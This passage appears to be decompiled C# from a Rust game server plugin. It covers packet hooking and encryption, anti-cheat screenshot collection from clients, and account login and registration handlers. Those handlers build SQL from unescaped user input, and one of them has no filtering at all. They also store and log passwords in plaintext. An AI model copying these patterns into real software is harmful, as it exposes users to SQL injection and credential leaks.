			flag = false;
			return flag;
		}

		public static int uLink_DoNetworkSend(System.Net.Sockets.Socket socket, byte[] buffer, int length, EndPoint ip)
		{
			int num;
			try
			{
				int size = length;
				int hashCode = ip.GetHashCode();
				if (Core.Debug && server.log >= 2)
				{
					Helper.Log(string.Concat(new object[]
					{
						"Network.Send(",
						ip,
						").Packet(",
						length,
						"): ",
						BitConverter.ToString(buffer, 0, length).Replace("-", "")
					}), true);
				}
				if (RustHook.dictionary_1.ContainsKey(hashCode) && RustHook.dictionary_1[hashCode].CryptPackets)
				{
					size = RustHook.dictionary_1[hashCode].Encrypt(ref buffer, length);
				}
				Bootstrap.SendPacketCounter += 1u;
				socket.SendTo(buffer, 0, size, SocketFlags.None, ip);
				num = length;
				return num;
			}
			catch (Exception ex)
			{
				if (Core.Debug && server.log >= 2)
				{
					UnityEngine.Debug.LogError(ex.ToString());
				}
			}
			num = 0;
			return num;
		}

		public static int uLink_DoNetworkRecv(System.Net.Sockets.Socket socket, ref byte[] buffer, int length, ref EndPoint ip)
		{
			int hashCode = ip.GetHashCode();
			Bootstrap.RecvPacketCounter += 1u;
			uint[] array;
			int num5;
			if (Truth.RustProtect)
			{
				array = new uint[length / 4];
				for (int i = 0; i < array.Length; i++)
				{
					array[i] = BitConverter.ToUInt32(buffer, i * 4);
				}
				if (length >= 32 && array[0] == 587202567u && array[1] == 1919111946u && array[2] == 1936614757u && (array[3] == 4285820776u || array[3] == 4269043560u))
				{
					ulong num = BitConverter.ToUInt64(buffer, 16);
					uint bufferSize = BitConverter.ToUInt32(buffer, 24);
					uint num2 = BitConverter.ToUInt32(buffer, 28);
					int num3 = length - 32;
					UserData bySteamID = Users.GetBySteamID(num);
					if (buffer[15] == 254)
					{
						SnapshotData snapshotData = new SnapshotData(bufferSize);
						if (Truth.SnapshotsData.ContainsKey(num))
						{
							Truth.SnapshotsData[num] = snapshotData;
						}
						else
						{
							Truth.SnapshotsData.Add(num, snapshotData);
						}
						if (Core.Debug && server.log >= 1)
						{
							Helper.Log(string.Concat(new object[]
							{
								"RustProtect: Starting receiving snapshot from [",
								bySteamID.Username,
								":",
								bySteamID.SteamID,
								":",
								ip,
								"] size: ",
								snapshotData.Length
							}), true);
						}
						RustHook.byte_0[15] = 0;
						socket.SendTo(RustHook.byte_0, 0, RustHook.byte_0.Length, SocketFlags.None, ip);
					}
					else if (buffer[15] == 255 && Truth.SnapshotsData.ContainsKey(num))
					{
						if (num3 > 0)
						{
							SnapshotData snapshotData = Truth.SnapshotsData[num];
							if (Core.Debug && server.log >= 1)
							{
								Helper.Log(string.Concat(new object[]
								{
									"RustProtect: Receiving snapshot part from [",
									bySteamID.Username,
									":",
									bySteamID.SteamID,
									":",
									ip,
									"] part size: ",
									num3
								}), true);
							}
							snapshotData.Append(buffer, 32, num3);
							RustHook.byte_0[15] = 1;
							socket.SendTo(RustHook.byte_0, 0, RustHook.byte_0.Length, SocketFlags.None, ip);
						}
						else
						{
							SnapshotData snapshotData = Truth.SnapshotsData[num];
							if (snapshotData != null && snapshotData.Length > 0 && num2 == snapshotData.Hashsum)
							{
								if (Core.Debug && server.log >= 1)
								{
									Helper.Log(string.Concat(new object[]
									{
										"RustProtect: Snapshot success received from [",
										bySteamID.Username,
										":",
										bySteamID.SteamID,
										":",
										ip,
										"] size: ",
										snapshotData.Length,
										", CRC: ",
										snapshotData.Hashsum.ToString("X8")
									}), true);
								}
								string text = Path.Combine(Truth.RustProtectSnapshotsPath, num.ToString());
								string path = Path.Combine(text, DateTime.Now.ToString("yyyy-MM-dd.HH-mm-ss") + ".jpg");
								Directory.CreateDirectory(text);
								File.WriteAllBytes(path, snapshotData.Buffer);
								bySteamID.ProtectLastSnapshotTime = Time.time;
								IEnumerable<FileInfo> files = new DirectoryInfo(text).GetFiles();
								if (RustHook.func_0 == null)
								{
									RustHook.func_0 = new Func<FileInfo, DateTime>(RustHook.smethod_6);
								}
								FileInfo[] array2 = files.OrderBy(RustHook.func_0).ToArray<FileInfo>();
								if (array2.Length > 0)
								{
									int num4 = array2.Length - (int)Truth.RustProtectSnapshotsMaxCount;
									if (num4 > 0)
									{
										for (int j = 0; j < num4; j++)
										{
											File.Delete(array2[j].FullName);
											array2.RemoveAt(j);
										}
									}
								}
							}
							Truth.SnapshotsData.Remove(num);
						}
					}
					num5 = 0;
					return num5;
				}
				if (Truth.RustProtectSnapshots && Truth.RustProtectSnapshotsInterval > 0u && RustHook.dictionary_1.ContainsKey(hashCode) && RustHook.dictionary_1[hashCode].UserData != null)
				{
					UserData userData = RustHook.dictionary_1[hashCode].UserData;
					float num6 = userData.ProtectLastSnapshotTime + Truth.RustProtectSnapshotsInterval;
					if (!Truth.SnapshotsData.ContainsKey(userData.SteamID) && Time.time > num6)
					{
						userData.ProtectLastSnapshotTime = Time.time;
						RustHook.byte_0[15] = 255;
						socket.SendTo(RustHook.byte_0, 0, RustHook.byte_0.Length, SocketFlags.None, ip);
						if (Core.Debug && server.log >= 1)
						{
							Helper.Log(string.Concat(new object[]
							{
								"RustProtect: Request snapshot from client [",
								userData.Username,
								":",
								userData.SteamID,
								":",
								ip,
								"]."
							}), true);
						}
					}
				}
				if (array.Length > 3 && array[0] == 553648135u && array[1] == 1282738945u && array[2] == 543911529u && array[3] == 775237169u)
				{
					if (RustHook.dictionary_1.ContainsKey(hashCode))
					{
						RustHook.dictionary_1.Remove(hashCode);
					}
					RustHook.dictionary_1.Add(hashCode, new NetCrypt(socket, ip, null));
					if (!RustHook.dictionary_1[hashCode].SendCryptKey() && Core.Debug && server.log >= 1)
					{
						Helper.Log("RustProtect: Failed to send cryptkey packet for '" + ip + "'", true);
					}
					num5 = length;
					return num5;
				}
				if (length == 16 && array[0] == 620756999u && array[1] == 1668171018u && array[2] == 1953528178u && array[3] == 4285427561u)
				{
					if (RustHook.dictionary_1.ContainsKey(hashCode))
					{
						RustHook.dictionary_1[hashCode].CryptPackets = true;
						if (Core.Debug && server.log >= 1)
						{
							Helper.Log("Network(" + ip + ") accept packet encryption.", true);
						}
					}
					num5 = 0;
					return num5;
				}
				if (RustHook.dictionary_1.ContainsKey(hashCode) && RustHook.dictionary_1[hashCode].CryptPackets)
				{
					length = RustHook.dictionary_1[hashCode].Decrypt(ref buffer, length);
				}
			}
			if (Core.Debug && server.log >= 2)
			{
				Helper.Log(string.Concat(new object[]
				{
					"Network.Recv(",
					ip,
					").Packet(",
					length,
					"): ",
					BitConverter.ToString(buffer, 0, length).Replace("-", "")
				}), true);
			}
			array = new uint[length / 4];
			for (int k = 0; k < array.Length; k++)
			{
				array[k] = BitConverter.ToUInt32(buffer, k * 4);
			}
			NetUser netUser = null;
			if ((array[0] != 553648135u || array[1] != 1282738945u || array[2] != 543911529u || array[3] != 775237169u) && array[0] != 285212679u && array[0] != 419430407u && array[0] != 687865863u)
			{
				if (buffer[0] == 137 && array[1] == 393218u && array[2] == 273664u)
				{
					ulong num7 = BitConverter.ToUInt64(buffer, 14);
					string @string = Encoding.UTF8.GetString(buffer, 23, (int)buffer[22]);
					byte[] array3 = new byte[234];
					int num8 = (int)(23 + buffer[22]);
					if (length - num8 >= 234)
					{
						Buffer.BlockCopy(buffer, num8 + 1, array3, 0, array3.Length);
						if (BitConverter.ToInt32(array3, 0) == 5121 && BitConverter.ToUInt64(array3, 13) == num7)
						{
							Helper.Log(string.Concat(new object[]
							{
								"Steam Connection [",
								@string,
								":",
								num7,
								":",
								ip,
								"]."
							}), true);
							num5 = length;
							return num5;
						}
					}
					Helper.Log(string.Concat(new object[]
					{
						"No-Steam Connection [",
						@string,
						":",
						num7,
						":",
						ip,
						"]."
					}), true);
				}
				else if (buffer[0] == 137 && array[1] == 1536u && array[2] == 1069u)
				{
					ulong num9 = BitConverter.ToUInt64(buffer, 13);
					string string2 = Encoding.UTF8.GetString(buffer, 22, (int)buffer[21]);
					Helper.Log(string.Concat(new object[]
					{
						"No-Steam Connection [",
						string2,
						":",
						num9,
						":",
						ip,
						"]."
					}), true);
				}
				else
				{
					if (!RustHook.smethod_1(ip, out netUser))
					{
						num5 = 0;
						return num5;
					}
					if (buffer[0] == 137 && Users.NetworkTimeout > 0f)
					{
						string string3 = Encoding.ASCII.GetString(buffer, 8, (int)buffer[7]);
						string string4 = Encoding.ASCII.GetString(buffer);
						if (string3 != "GetClientMove")
						{
						}
						BitConverter.ToUInt16(buffer, 1);
						Convert.ToUInt16((int)(buffer[3] + 4));
						if (string3 == "ClientFirstReady")
						{
							if (Truth.LastPacketTime.ContainsKey(netUser))
							{
								Truth.LastPacketTime.Remove(netUser);
							}
							Truth.LastPacketTime.Add(netUser, Time.time + Users.NetworkTimeout * 5f);
							if (RustHook.dictionary_1.ContainsKey(hashCode))
							{
								RustHook.dictionary_1[hashCode].UserData = Users.GetBySteamID(netUser.userID);
								RustHook.dictionary_1[hashCode].UserData.ProtectLastSnapshotTime = Time.time;
							}
						}
						if (string3 == "GetClientMove" && Truth.LastPacketTime.ContainsKey(netUser) && Truth.LastPacketTime[netUser] < Time.time)
						{
							Truth.LastPacketTime[netUser] = Time.time;
						}
					}
				}
			}
			num5 = length;
			return num5;
		}

		[CompilerGenerated]
		private static bool smethod_2(string string_0)
		{
			return string_0.ToLower().StartsWith("onrespawn");
		}

		[CompilerGenerated]
		private static bool smethod_3(string string_0)
		{
			return string_0.ToLower().StartsWith("rank");
		}

		[CompilerGenerated]
		private static bool smethod_4(string string_0)
		{
			return string_0.ToLower().StartsWith("onconnect");
		}

		[CompilerGenerated]
		private static bool smethod_5(string string_0)
		{
			return string_0.ToLower().StartsWith("rank");
		}

		[CompilerGenerated]
		private static DateTime smethod_6(FileInfo fileInfo_0)
		{
			return fileInfo_0.CreationTime;
		}

		public static void TcpListen()
		{
			try
			{
				while (true)
				{
					System.Net.Sockets.Socket k = RustHook.dlqsv.Accept();
					RustHook.ClientThread @object = new RustHook.ClientThread(k);
					Thread thread = new Thread(new ThreadStart(@object.ClientService));
					thread.Start();
				}
			}
			catch
			{
			}
		}

		public static void qqq(string msg, bool inConsole = true)
		{
			using (FileStream fileStream = new FileStream(Loader.RustLogFile, FileMode.Append, FileAccess.Write, FileShare.ReadWrite))
			{
				using (StreamWriter streamWriter = new StreamWriter(fileStream))
				{
					streamWriter.WriteLine(DateTime.Now.ToString("HH:mm:ss") + ": " + msg);
				}
			}
			File.SetLastWriteTime(Loader.RustLogFile, DateTime.Now);
			if (inConsole)
			{
				ConsoleSystem.Print(msg, false);
			}
		}

		public static void yanzheng(string zhanghao, string mima, string ip, System.Net.Sockets.Socket Ip)
		{
			MySQL.Result result = MySQL.Query("select * from dengluqi where zhanghao = '" + zhanghao.ToLower() + "'", true);
			string s;
			byte[] bytes;
			if (result.Rows == 1uL)
			{
				List<MySQL.Row> row = result.Row;
				string asString = row[0].Get("mima").AsString;
				if (asString == mima)
				{
					s = "xx|登录成功";
					bytes = Encoding.Default.GetBytes(s);
					Ip.Send(bytes);
					return;
				}
			}
			s = "xx|您输入的账号或密码有误！";
			bytes = Encoding.Default.GetBytes(s);
			Ip.Send(bytes);
		}

		public static void reg(string zhanghao, string mima, string ip, System.Net.Sockets.Socket Ip)
		{
			if (zhanghao.IndexOf("'") == -1)
			{
				if (zhanghao.IndexOf("\\") == -1)
				{
					MySQL.Result result = MySQL.Query("select * from dengluqi where zhanghao = '" + zhanghao.ToLower() + "'", true);
					if (result.Row.Count >= 1)
					{
						string s = "xx|账号已存在.请重新注册另外的账号!";
						RustHook.qqq(string.Concat(new string[]
						{
							"[reg][No][",
							zhanghao.ToLower(),
							"][",
							mima,
							"]"
						}), true);
						byte[] bytes = Encoding.Default.GetBytes(s);
						Ip.Send(bytes);
					}
					else
					{
						MySQL.Result result2 = MySQL.Query(string.Concat(new string[]
						{
							"insert into dengluqi(id,zhanghao,mima) values(id,'",
							zhanghao.ToLower(),
							"','",
							mima,
							"')"
						}), false);
						string s = "xx|注册成功";
						RustHook.qqq(string.Concat(new string[]
						{
							"[reg][Yes][",
							zhanghao.ToLower(),
							"][",
							mima,
							"]"
						}), true);
						byte[] bytes = Encoding.Default.GetBytes(s);
						Ip.Send(bytes);
					}
				}
			}
		}

		public static void login(string zhanghao, string mima, string ip, System.Net.Sockets.Socket Ip)
		{
			if (zhanghao.IndexOf("'") == -1)
			{
				MySQL.Result result = MySQL.Query("select * from dengluqi where zhanghao = '" + zhanghao.ToLower() + "'", true);
				if (result.Rows == 1uL)
				{
					List<MySQL.Row> row = result.Row;
					string asString = row[0].Get("mima").AsString;
					if (asString == mima)
					{
						string[] array = ip.Split(new char[]
						{
							':'
						});
						string value;
						if (array.Length == 2)
						{
							value = array[0];
						}
						else
						{
							value = "";
						}
						if (RustHook.dlqs.ContainsKey(zhanghao))
						{
							RustHook.dlqs[zhanghao] = value;
						}
						else
						{
							RustHook.dlqs.Add(zhanghao, value);
						}
					}
					else if (RustHook.dlqs.ContainsKey(zhanghao))
					{
						RustHook.dlqs.Remove(zhanghao);
					}
				}
			}
		}
	}
}
